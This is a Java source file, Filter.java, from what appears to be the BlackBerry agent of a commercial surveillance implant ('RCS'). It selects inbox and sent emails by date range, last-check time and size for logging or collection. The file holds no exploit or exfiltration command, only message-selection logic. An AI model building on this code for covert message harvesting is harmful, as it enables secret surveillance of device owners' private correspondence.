//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : Filter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module.mail;

import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class Filter.
 */
public class Filter {
    //#ifdef DEBUG
    static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);
    //#endif

    public static final int TYPE_REALTIME = 0;
    public static final int TYPE_COLLECT = 1;

    public static final int CLASS_UNKNOWN = 0;
    public static final int CLASS_SMS = 1;
    public static final int CLASS_MMS = 2;
    public static final int CLASS_EMAIL = 3;

    static final int FILTERED_DISABLED = -1;
    static final int FILTERED_LASTCHECK = -2;
    static final int FILTERED_DATEFROM = -3;
    static final int FILTERED_DATETO = -4;
    static final int FILTERED_SIZE = -5;
    static final int FILTERED_MESSAGE_ADDED = -6;
    static final int FILTERED_NOTFOUND = -7;
    static final int FILTERED_INTERNAL = -8;
    static final int FILTERED_SENDMAIL = -9;
    static final int FILTERED_OK = 0;

    int[] folderTypes = new int[] { Folder.INBOX, Folder.SENT };

    public int size;

    public int version;
    public int type;
    public byte[] classname;
    public int classtype;

    public boolean enabled;
    public boolean all;
    public boolean doFilterFromDate;
    public Date fromDate;
    public boolean doFilterToDate;
    public Date toDate;
    public int maxMessageSize;
    public int maxMessageSizeToLog;

    public Vector keywords = new Vector();

    boolean valid;

    public int payloadStart;

    public Filter(boolean enabled, Date from, Date to, int maxMessageSize,
            int maxMessageSizeToLog) {
        this.enabled = enabled;
        if (from != null) {
            this.fromDate = from;
            doFilterFromDate = true;
        }
        if (to != null) {
            this.toDate = to;
            doFilterToDate = true;
        }
        this.maxMessageSize = maxMessageSize;
        this.maxMessageSizeToLog = maxMessageSizeToLog;
    }

    public Filter(boolean mailEnabled, int maxSizeToLog) {
        this(mailEnabled, null, null, maxSizeToLog, maxSizeToLog);
    }

    /**
     * Filter message.
     * 
     * @param message
     *            the message
     * @param lastcheck
     *            the lastcheck
     * @param checkAdded
     * @return the int
     * @throws MessagingException
     *             the messaging exception
     */
    public final int filterMessage(final Message message, final long lastcheck)
            throws MessagingException {

        //#ifdef DBC
        Check.requires(message != null, "filterMessage: message != null");
        //#endif

        long receivedTime;

        if (!enabled) {
            //#ifdef DEBUG
            debug.info("Disabled");
            //#endif            
            return FILTERED_DISABLED;
        }

        //#ifdef DEBUG
        debug.trace("filterMessage: " + message.getMessageId());
        //#endif

        final Address[] from = message
                .getRecipients(Message.RecipientType.FROM);
        //#ifdef DBC
        Check.asserts(from != null, "filterMessage: from!=null");
        //#endif

        final Folder folder = message.getFolder();

        //#ifdef DEBUG
        String foldername = "NO_FOLDER";
        int foldertype = -1;
        //#endif

        boolean found = false;
        if (folder != null) {
            final int folderType = folder.getType();
            final int fsize = folderTypes.length;

            for (int i = 0; i < fsize; i++) {
                if (folderTypes[i] == folderType) {
                    found = true;
                    break;
                }
            }
            //#ifdef DEBUG
            foldername = folder.getName();
            foldertype = folder.getType();
            //#endif
        }

        if (!found) {
            //#ifdef DEBUG
            debug.info("filterMessage: FILTERED_NOTFOUND: " + foldername
                    + " type: " + foldertype);
            //#endif
            return FILTERED_NOTFOUND;
        }

        receivedTime = message.getReceivedDate().getTime();
        if (lastcheck != 0 && receivedTime < lastcheck) {
            //#ifdef DEBUG
            debug.info("receivedTime < lastcheck :" + receivedTime + " < "
                    + lastcheck);
            //#endif
            return FILTERED_LASTCHECK;
        }

        // se c'e' il filtro from e non viene rispettato escludi la mail
        if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
            //#ifdef DEBUG
            debug.info("doFilterFromDate: " + fromDate);
            //#endif
            return FILTERED_DATEFROM;
        }

        // Se c'e' anche il filtro della data di fine e non viene rispettato
        // escludi la mail
        if (doFilterToDate == true && receivedTime > toDate.getTime()) {
            //#ifdef DEBUG
            debug.info("doFilterToDate: " + toDate);
            //#endif
            return FILTERED_DATETO;
        }

        if ((maxMessageSizeToLog > 0)
                && (message.getSize() > maxMessageSizeToLog)) {
            //#ifdef DEBUG
            debug.info("maxMessageSizeToLog: " + maxMessageSizeToLog);
            //#endif
            return FILTERED_SIZE;
        }

        return FILTERED_OK;
    }

    public final int filterMessage(final Message message)
            throws MessagingException {
        return filterMessage(message, 0);
    }

    /**
     * Checks if is valid.
     * 
     * @return true, if is valid
     */
    public final boolean isValid() {
        return valid;
    }

    public boolean equals(Object obj) {
        boolean ret = true;
        if (obj == null) {
            return false;
        }

        if (!(obj instanceof Filter)) {
            return false;
        }

        final Filter filter = (Filter) obj;

        ret &= filter.doFilterFromDate == doFilterFromDate;
        ret &= filter.doFilterToDate == doFilterToDate;
        ret &= filter.fromDate == fromDate;
        ret &= filter.toDate == toDate;
        ret &= filter.enabled == enabled;
        ret &= filter.maxMessageSize == maxMessageSize;
        ret &= filter.maxMessageSizeToLog == maxMessageSizeToLog;

        return ret;
    }

    public int hashCode() {
        int hash = fromDate.hashCode() ^ toDate.hashCode();
        int flags = 0;
        if (doFilterFromDate) {
            flags |= 1 << 16;
        }
        if (doFilterToDate) {
            flags |= 1 << 17;
        }

        hash ^= flags;
        hash ^= maxMessageSize << 16;
        hash ^= maxMessageSizeToLog;

        return hash;
    }

    //#ifdef DEBUG
    public final String toString() {
        final StringBuffer sb = new StringBuffer();

        switch (classtype) {
            case Filter.CLASS_EMAIL:
                sb.append("EMAIL ");
                break;
            case Filter.CLASS_MMS:
                sb.append("MMS ");
                break;
            case Filter.CLASS_SMS:
                sb.append("SMS ");
                break;
        }
        if (type == TYPE_COLLECT) {
            sb.append(" COLLECT");
        } else if (type == TYPE_REALTIME) {
            sb.append(" RT");
        }

        if (doFilterFromDate == true && fromDate != null) {
            sb.append(" from: ");
            sb.append(fromDate);
        }

        if (doFilterToDate == true && toDate != null) {
            sb.append(" to: ");
            sb.append(toDate);
        }

        sb.append(" size: " + maxMessageSize);
        sb.append(" log: " + maxMessageSizeToLog);
        sb.append(" en: " + enabled);

        return sb.toString();
    }
    //#endif
}
